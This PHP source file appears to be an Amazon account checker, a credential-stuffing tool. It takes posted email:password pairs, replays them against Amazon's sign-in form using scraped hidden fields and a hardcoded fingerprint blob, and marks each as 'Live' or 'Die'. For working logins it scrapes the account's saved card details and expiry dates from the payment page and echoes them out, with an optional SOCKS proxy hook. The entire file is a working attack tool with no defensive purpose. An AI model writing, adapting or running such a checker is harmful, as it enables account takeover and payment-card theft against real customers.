<?php

require ('./class_mail.php');
require ('./class_curl.php');

function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}
if ($_POST['do'] == 'check')
{
	
    $mail = new Mail();
    $curl = new curl();
    delete_cookies();
    $curl->ua('Mozilla/5.0 (Windows NT 6.3; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0');
   
    $result = array();
    $delim = urldecode($_POST['delim']);
    list($email, $pwd) = explode($delim, urldecode($_POST['mailpass']));
    //$sock = urldecode($_POST['sock']);

    if (!$email)
    {
        $result['error'] = -1;
        $result['msg'] = urldecode($_POST['mailpass']);
        echo json_encode($result);
        exit;
    }
    
    delete_cookies();
    //$curl->sock5($sock);
	$curl->page('https://www.amazon.com/ap/oa?client_id=amzn1.application-oa2-client.ce3d03af3a254f4ca7059154fe68df78&redirect_uri=https%3A%2F%2Fapi-cdn.amazon.com%2Fsdk%2F2014-02-12-k8c52wxs%2Ftopic.html%3Furi%3Dhttps%253A%252F%252Fsites.fastspring.com%252Flimeproxies%252Finstant%252F100premium%26proxy%3Damazon-proxy-https-api_cdn_amazon_com%26topic%3D0k4b9vs6arYS2ihS%26version%3D1&response_type=token&scope=payments%3Awidget');
	if($curl->validate()){
		
		$appActionToken = getStr($curl->content,'name="appActionToken" value="','"');
		$auth_age = getStr($curl->content,'name="openid.pape.max_auth_age" value="','"');
		$signedMetricIdentifier = getStr($curl->content,'name="signedMetricIdentifier" value="','"');
		$a = getStr($curl->content,'name="openid.ns" value="','"');
		$b = getStr($curl->content,'name="openid.ns.pape" value="','"');
		$c = getStr($curl->content,'name="pageId" value="','"');
		$d = getStr($curl->content,'name="openid.identity" value="','"');
		$e = getStr($curl->content,'name="openid.claimed_id" value="','"');
		$f = getStr($curl->content,'name="openid.mode" value="','"');
		$g = getStr($curl->content,'name="oauth2params" value="','"');
		$h = getStr($curl->content,'name="openid.assoc_handle" value="','"');
		$i = getStr($curl->content,'name="marketPlaceId" value="','"');
		$j = getStr($curl->content,'name="metricIdentifier" value="','"');
		$k = getStr($curl->content,'name="openid.return_to" value="','"');
		
		
		$fullink = getStr($curl->content,'id="ap_signin_form" novalidate="novalidate" action="','"');
		$var = 'appActionToken='.urlencode($appActionToken).'&appAction=SIGNIN&openid.pape.max_auth_age='.urlencode($auth_age).'&signedMetricIdentifier='.urlencode($signedMetricIdentifier).'&openid.ns='.urlencode($a).'&openid.ns.pape='.urlencode($b).'&pageId='.urlencode($c).'&openid.identity='.urlencode($d).'&openid.claimed_id='.urlencode($e).'&openid.mode='.urlencode($f).'&oauth2params='.urlencode($g).'&openid.assoc_handle='.urlencode($h).'&marketPlaceId='.urlencode($i).'&metricIdentifier='.urlencode($j).'&openid.return_to='.urlencode($k).'&email='.urlencode($email).'&password='.$pwd.'&metadata1=ig6RrOt%2Bx%2B4PYeUORcfk46nioSgD%2B5fj0E409OvQ5o7xCGqcAbDYx%2BhcaNXICtZScnX1W4oP1wv0pK%2BkR8IKT5ltv5X9VGYyRpiORqRILlLFPEDqv1jjlunGSj6qj5y6JrgtnkRojXdRXNKGzpx0%2BNelmmwBtYR4Gqe5ZK4o6%2FX1BHTs6jfSI4%2FTO7WJD%2Bd9p95aIVGErJ3%2FK%2FdBlGtdsMvLKpfXKvDjcI%2B4MEjPUuXAh8Evk7dQuUlQJ8uRpYsRhaCuqtzWILxHFQxF9WxPIMggXWZCxBuz9WdDnOkAlPMhgmBgkJ0uXbCa21GmLg5DbDglH9b2wA7xPiauDedziYu2LQAa4Ci2sk5uFDZ4ZAJLR2UPEubfQ6sVFZ4kwMR18%2BZDEf5DkmZBG29%2B5LAX1uQt32ATaVzu27xXfvv02hTx%2Bi6%2BfTiCu4nZ5e9yYq8YKXW44mTTtkCYOx79QQzAkjggMtysr1hZm1jIZDIRq0lIAZ7UCARROE2EvCSa1boCjodjH9RMisa4s8G%2BaayP0dY%2FfpOnHgtLoRoZxP583joAFvUQGmWJkMyTNm8%3D';
		$curl->postdata($var);
		//$curl->ref($ref);
		$curl->page($fullink);
		
		if($curl->validate()){
		
		
		//	file_put_contents('text.html', $curl->content);
			 
			 if(stripos($curl->content, "here was a problem with your reques") == false){
				$curl->page('https://www.amazon.com/gp/aw/ya/p');
				$cc = getStr($curl->content,'<hr size="1" noshade="noshade" />','<input type="hidden" name="');
				$cc1 = str_replace(' ','',$cc);
				$cc2 = str_replace('\n','',$cc1);
				$cc3 = str_replace('\r\n','',$cc2);
				$cc4 = str_replace('<br>','',$cc3);
				$cc5 = str_replace('Expiration Date','',$cc4);
				
				$result['error'] = 0;
				$result['msg'] = $result['msg'] = '<b style="color:yellow;">Live</b> => ' . $sock . ' | ' . $email .
                        ' | ' .$pwd.' | <font color="yellow">'.$cc5.'|</font> www.technologychecker.us'; 
			 

			 }
			 elseif(stripos($curl->content, "here was a problem with your reques") !== false){
			 
				$result['error'] = 2;
                $result['msg'] = '<b style="color:red;">Die</b> => ' . $email . ' | ' . $pwd.' | Checked'; 

			 }
			
			 else{
			 
					 
			 	$result['error'] = 2;
                $result['msg'] = '<b style="color:red;">Die</b> => ' . $email . ' | ' . $pwd.' | Checked'; 
			 }
			
							
		}else{
	
	
		$result['error'] = 1;
        $result['msg'] = $sock . ' => Die/Timeout1';
	
		}	
		
	
	
	}else{
	
	
		$result['error'] = 1;
        $result['msg'] = $sock . ' => Die/Timeout1';
	
	}
	
	

    echo json_encode($result);
    exit;

}

?>